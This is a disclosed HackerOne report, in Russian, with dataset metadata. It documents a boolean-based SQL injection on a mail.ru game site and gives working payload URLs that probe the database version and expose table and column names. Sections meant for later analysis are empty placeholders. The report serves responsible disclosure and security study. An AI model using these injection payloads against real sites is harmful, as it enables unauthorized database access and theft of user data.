---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '15762'
original_report_id: '15762'
title: SQL Injection on 11x11.mail.ru
weakness: SQL Injection
team_handle: mailru
created_at: '2014-06-09T16:55:19.164Z'
disclosed_at: '2014-09-16T05:08:14.311Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- sql-injection
---

# SQL Injection on 11x11.mail.ru

## Metadata

- HackerOne Report ID: 15762
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-09-16T05:08:14.311Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Приветствую!

SQL Inject (boolean-based)

True
http://11x11.mail.ru/xml/games/champ.php?act=groups&division=6&tournament=66+and+1=if(substr((@@version),1,5)=0x352e302e37,1,2)%23

(Сезон 22, Дивизион 3-C)

False
http://11x11.mail.ru/xml/games/champ.php?act=groups&division=6&tournament=66+and+1=if(substr((@@version),1,5)=0x352e302e36,1,2)%23

(Сезон , Дивизион 3-C)

То есть при логически правильно запросе - выводит номер сезона, при неправильном - не выводит.

Условия:
1) Нужно быть залогиненным на сайте.

Полученные данные:

@@version - 5.0.7-log

Через http://11x11.mail.ru/xml/games/champ.php?act=groups&tournament=66+limit+0,1+PROCEDURE+ANALYSE()%23&division=6  узнаём данные, участвующие в запросе:

(Сезон nekki-11x11.champ_tournaments.Number, Дивизион 3-C)

Считаю данную уязвимость критической, вследствие наличия доступа к большому объёму данных, находящихся на сайте (зарегистрированные пользователи и не только).

Статистика

Игроков онлайн: 5.505 
Игроков за неделю: 30.846 
Зарегистрировано: 6.420.126

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
